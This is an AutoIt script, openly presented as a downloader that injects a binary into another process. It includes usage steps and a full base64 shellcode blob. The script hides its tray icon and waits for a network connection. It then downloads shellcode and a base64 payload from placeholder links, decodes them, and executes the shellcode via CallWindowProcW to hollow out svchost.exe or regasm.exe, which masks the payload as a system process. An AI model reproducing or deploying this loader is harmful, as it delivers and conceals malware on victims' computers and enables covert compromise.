#NoTrayIcon
#include <WinAPIDiag.au3>
#cs

Author : Suleiman Al-Othman (@sulealothman)
Project Name : Inject Bin File into Process by Downloader
Ver. : 0.1

How to use ?

1- upload shell Asm into any upload site :
	YOhOAAAAawBlAHIAbgBlAGwAMwAyAAAAbgB0AGQAbABsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAW4v8akLouwMAAItUJCiJEYtUJCxqPuiqAwAAiRFqSuihAwAAiTlqHmo86J0DAABqImj0AAAA6JEDAABqJmok6IgDAABqKmpA6H8DAABqLmoM6HYDAABqMmjIAAAA6GoDAABqKuhcAwAAiwnHAUQAAABqEuhNAwAAaFvoFM9R6HkDAABqPug7AwAAi9FqHugyAwAAakD/Mv8x/9BqEugjAwAAaFvoFM9R6E8DAABqHugRAwAAiwmLUTxqPugFAwAAizkD+moi6PoCAACLCWj4AAAAV1H/0GoA6OgCAABoiP6zFlHoFAMAAGou6NYCAACLOWoq6M0CAACLEWpC6MQCAABXUmoAagBqBGoAagBqAGoA/zH/0GoS6KkCAABo0DcQ8lHo1QIAAGoi6JcCAACLEWou6I4CAACLCf9yNP8x/9BqAOh+AgAAaJyVGm5R6KoCAABqIuhsAgAAixGLOWou6GECAACLCWpAaAAwAAD/clD/dzT/Mf/QajboRwIAAIvRaiLoPgIAAIs5aj7oNQIAAIsxaiLoLAIAAIsBai7oIwIAAIsJUv93VFb/cDT/MWoA6BACAABooWo92FHoPAIAAIPEDP/QahLo+QEAAGhb6BTPUeglAgAAaiLo5wEAAIsRg8IGajro2wEAAGoCUlH/0Go26M4BAADHAQAAAAC4KAAAAGo26LwBAAD3IWoe6LMBAACLEYtSPIHC+AAAAAPQaj7onwEAAAMRaibolgEAAGooUv8xahLoigEAAGhb6BTPUei2AQAAg8QM/9BqJuhzAQAAizmLCYtxFGo+6GUBAAADMWom6FwBAACLCYtRDGoi6FABAACLCQNRNGpG6EQBAACLwWou6DsBAACLCVD/dxBWUv8xagDoKgEAAGihaj3YUehWAQAAg8QM/9BqNugTAQAAixGDwgGJEWo66AUBAACLCTvKD4Uz////ajLo9AAAAIsJxwEHAAEAagDo5QAAAGjSx6doUegRAQAAajLo0wAAAIsRai7oygAAAIsJUv9xBP/QaiLouwAAAIs5g8c0ajLorwAAAIsxi7akAAAAg8YIai7onQAAAIsRakbolAAAAFFqBFdW/zJqAOiGAAAAaKFqPdhR6LIAAACDxAz/0Goi6G8AAACLCYtRKANRNGoy6GAAAACLCYHBsAAAAIkRagDoTwAAAGjTx6foUeh7AAAAajLoPQAAAIvRai7oNAAAAIsJ/zL/cQT/0GoA6CQAAABoiD9KnlHoUAAAAGou6BIAAACLCf9xBP/QakroBAAAAIshYcOLywNMJATDagDo8v///2hUyq+RUegeAAAAakBoABAAAP90JBhqAP/Q/3QkFOjP////iQGDxBDD6CIAAABopE4O7FDoSwAAAIPECP90JAT/0P90JAhQ6DgAAACDxAjDVVJRU1ZXM8Bki3Awi3YMi3Yci24Ii34gizY4Rxh184A/a3QHgD9LdALr54vFX15bWVpdw1VSUVNWV4tsJByF7XRDi0U8i1QoeAPVi0oYi1ogA93jMEmLNIsD9TP/M8D8rITAdAfBzw0D+Ov0O3wkIHXhi1okA91miwxLi1ocA92LBIsDxV9eW1laXcPDAAAAAA==

2- copy raw | direct link and replace [shellAsm_link]

3- Convert yor file to base64 and upload to any upload site

4- copy raw | direct link and replace [base64_file_link]

5- choose process inject and replace [inject]

Inject .net : @WindowsDir & "\Microsoft.NET\Framework\v2.0.50727\regasm.exe" or 
				@WindowsDir & "\Microsoft.NET\Framework\v4.0.30319\regasm.exe"
Inject native : @SystemDir & "\svchost.exe"

#ce

Func _Base64Decode_MS($input_string)
    Local $tInput = DllStructCreate('char[' & StringLen($input_string) + 1 & ']')
    DllStructSetData($tInput, 1, $input_string & 0)
    Local $aSize = DllCall("Crypt32.dll", "bool", "CryptStringToBinary", "struct*", $tInput, "dword", 0, "dword", 1, "ptr", 0, "dword*", 0, "ptr", 0, "ptr", 0)
    Local $tDecoded = DllStructCreate("byte[" & $aSize[5] & "]")
    Local $aDecode = DllCall("Crypt32.dll", "bool", "CryptStringToBinary", "struct*", $tInput, "dword", 0, "dword", 1, "struct*", $tDecoded, "dword*", $aSize[5], "ptr", 0, "ptr", 0)
    If Not $aDecode[0] Or @error Then Return SetError(1, 0, 0)
    Return DllStructGetData($tDecoded, 1)
EndFunc 

$tHost = "[inject]"

while true

	if _WinAPI_IsInternetConnected() then
		Sleep(10000)

		$http = ObjCreate("Microsoft.XMLHTTP")
		$http.Open("POST","[shellAsm_link]",false)
		$http.send("")
		$shCode = $http.responseText

		$http = ObjCreate("Microsoft.XMLHTTP")
		$http.Open("POST","base64_file_link",false)
		$http.send("")
		$bin = $http.responseText

		$decShellCode = _Base64Decode_MS($shCode)
		$buffAsm = DllStructCreate("byte[" & BinaryLen($decShellCode) & "]")
		DllStructSetData($buffAsm, 1, $decShellCode)

		$decBin = _Base64Decode_MS($bin)
		$buffBin = DllStructCreate("byte[" & BinaryLen($decBin) & "]")
		DllStructSetData($buffBin, 1, $decBin)

		DllCall("user32.dll", "int", "CallWindowProcW", _ 
			"ptr", DllStructGetPtr($buffAsm), _
			"wstr", ($tHost), _
			"ptr", DllStructGetPtr($buffBin), _
			"int", 0, _
			"int", 0)

		ExitLoop
	endif

Sleep(7000)
wend